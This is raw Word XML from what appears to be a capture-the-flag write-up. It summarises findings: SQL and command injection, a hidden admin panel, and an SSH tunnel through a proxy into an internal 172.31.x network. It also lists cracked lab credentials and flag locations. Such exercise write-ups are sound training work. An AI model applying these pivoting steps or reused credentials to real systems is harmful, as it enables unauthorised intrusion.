      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="53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Find and read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the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r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4"/>
          <w:szCs w:val="24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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>k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ed ha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h of the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u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er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4"/>
          <w:szCs w:val="24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m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ed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ou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ts_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p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y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b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le:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="4" w:line="100" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="11"/>
          <w:szCs w:val="11"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="2160"/>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:sectPr w:rsidR="00CF78E9">
          <w:headerReference w:type="default" r:id="rId31"/>
          <w:pgSz w:w="12240" w:h="15840"/>
          <w:pgMar w:top="700" w:right="0" w:bottom="280" w:left="0" w:header="0" w:footer="696" w:gutter="0"/>
          <w:cols w:space="720"/>
        </w:sectPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Courier New" w:eastAsia="Courier New" w:hAnsi="Courier New" w:cs="Courier New"/>
          <w:color w:val="6F2F9F"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>HR_sez_who_is_Mannie</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="180" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="007E35E5">
      <w:pPr>
        <w:ind w:left="1085"/>
      </w:pPr>
      <w:r>
        <w:pict>
          <v:shape id="_x0000_i1029" type="#_x0000_t75" style="width:498pt;height:126pt">
            <v:imagedata r:id="rId32" o:title=""/>
          </v:shape>
        </w:pict>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="19" w:line="220" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="34"/>
        <w:ind w:left="1685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  <w:u w:val="single" w:color="404040"/>
        </w:rPr>
        <w:t xml:space="preserve">What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  <w:u w:val="single" w:color="404040"/>
        </w:rPr>
        <w:t>W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  <w:u w:val="single" w:color="404040"/>
        </w:rPr>
        <w:t>e Know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  <w:u w:val="single" w:color="404040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  <w:u w:val="single" w:color="404040"/>
        </w:rPr>
        <w:t>So F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  <w:u w:val="single" w:color="404040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  <w:u w:val="single" w:color="404040"/>
        </w:rPr>
        <w:t>r:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="8" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="14"/>
          <w:szCs w:val="14"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1685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We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si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 is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v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nerab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 to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QL injec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ion and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mm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and injec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ion</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="8" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="14"/>
          <w:szCs w:val="14"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1685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Hid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en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ge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/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min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/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ol_pa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el.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hp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FL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G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1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nd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UE1</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="4" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="14"/>
          <w:szCs w:val="14"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1685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We c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 u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e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oo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’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cr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ials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o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et up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 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H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nel wi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ox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y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ins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o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he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nte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l</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="26"/>
        <w:ind w:left="1685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get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netwo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k</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="4" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="14"/>
          <w:szCs w:val="14"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1685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172.31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.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1.1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1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/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me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/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/b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nking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/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lagg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_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x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.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mp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nta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FLA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G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2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nd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2</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="4" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="14"/>
          <w:szCs w:val="14"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1685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\\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17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2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.31.1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.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12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\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x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y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\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x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y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\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ientX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\</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-4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ientX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_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246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0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1.jpg (000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0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010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9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.xl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x)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ntains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FL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G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3</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="7" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="14"/>
          <w:szCs w:val="14"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1685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\\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17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2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.31.1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.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12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\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x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y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\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x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y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\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01-05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-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25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.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synci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UE3</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="4" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="14"/>
          <w:szCs w:val="14"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="007E35E5">
      <w:pPr>
        <w:ind w:left="1685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pict>
          <v:group id="_x0000_s1092" style="position:absolute;left:0;text-align:left;margin-left:76.7pt;margin-top:-158.25pt;width:457.25pt;height:319.9pt;z-index:-1887;mso-position-horizontal-relative:page" coordorigin="1534,-3165" coordsize="9145,6398">
            <v:shape id="_x0000_s1093" style="position:absolute;left:1534;top:-3165;width:9145;height:6398" coordorigin="1534,-3165" coordsize="9145,6398" path="m1534,3233r9145,l10679,-3165r-9145,l1534,3233xe" filled="f">
              <v:path arrowok="t"/>
            </v:shape>
            <w10:wrap anchorx="page"/>
          </v:group>
        </w:pict>
      </w:r>
      <w:r w:rsidR="00A76861"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</w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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 w:rsidR="00A76861"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 w:rsidR="00A76861"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cked</w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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 w:rsidR="00A76861"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</w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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 w:rsidR="00A76861"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 w:rsidR="00A76861"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 w:rsidR="00A76861"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 w:rsidR="00A76861"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ntial</w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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s</w:t>
      </w:r>
      <w:r w:rsidR="00A76861"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:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="4" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="14"/>
          <w:szCs w:val="14"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRPr="00A86C10" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:line="381" w:lineRule="auto"/>
        <w:ind w:left="1685" w:right="8834"/>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A86C10">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>moo</w:t>
      </w:r>
      <w:r w:rsidRPr="00A86C10">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00A86C10">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>/ letme</w:t>
      </w:r>
      <w:r w:rsidRPr="00A86C10">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r w:rsidRPr="00A86C10">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">n </w:t>
      </w:r>
      <w:r w:rsidRPr="00A86C10">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r w:rsidRPr="00A86C10">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>d</w:t>
      </w:r>
      <w:r w:rsidRPr="00A86C10">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>min /</w:t>
      </w:r>
      <w:r w:rsidRPr="00A86C10">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00A86C10">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-3"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>p</w:t>
      </w:r>
      <w:r w:rsidRPr="00A86C10">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r w:rsidRPr="00A86C10">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>s</w:t>
      </w:r>
      <w:r w:rsidRPr="00A86C10">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>swo</w:t>
      </w:r>
      <w:r w:rsidRPr="00A86C10">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-3"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r w:rsidRPr="00A86C10">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>d</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:line="240" w:lineRule="exact"/>
        <w:ind w:left="1685"/>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A86C10">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r w:rsidRPr="00A86C10">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>ech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/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FL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G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{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h_p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ss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w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ord_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ck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}   </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="3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#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FLA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G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4</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="4" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="14"/>
          <w:szCs w:val="14"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:line="378" w:lineRule="auto"/>
        <w:ind w:left="1685" w:right="6113"/>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00A86C10">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>clue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 /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s_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e_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h_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_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a        </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="43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#CLU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4 </w:t>
      </w:r>
      <w:r w:rsidRPr="00A86C10">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>a</w:t>
      </w:r>
      <w:r w:rsidRPr="00A86C10">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>cc</w:t>
      </w:r>
      <w:r w:rsidRPr="00A86C10">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>o</w:t>
      </w:r>
      <w:r w:rsidRPr="00A86C10">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>unt</w:t>
      </w:r>
      <w:r w:rsidRPr="00A86C10">
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:b/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-2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_pa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y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le / H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_s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ez_w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o_i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_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nn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</w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="6" w:line="180" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="19"/>
          <w:szCs w:val="19"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1685"/>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:sectPr w:rsidR="00CF78E9">
          <w:pgSz w:w="12240" w:h="15840"/>
          <w:pgMar w:top="700" w:right="0" w:bottom="280" w:left="0" w:header="0" w:footer="696" w:gutter="0"/>
          <w:cols w:space="720"/>
        </w:sectPr>
      </w:pP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’s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Ma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nie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’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wo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v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so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ot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een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ck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,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ut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w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v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e their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</w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="8" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="15"/>
          <w:szCs w:val="15"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="17"/>
        <w:ind w:left="1080"/>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>Flag 5 –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40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>A</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>P</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t xml:space="preserve">T &amp; </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>t</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>he Po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40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>w</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>er</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-3"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>S</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>h</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="2"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>l</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>l Sym</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-3"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>p</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>ho</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-3"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="40"/>
          <w:szCs w:val="40"/>
        </w:rPr>
        <w:t>y</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
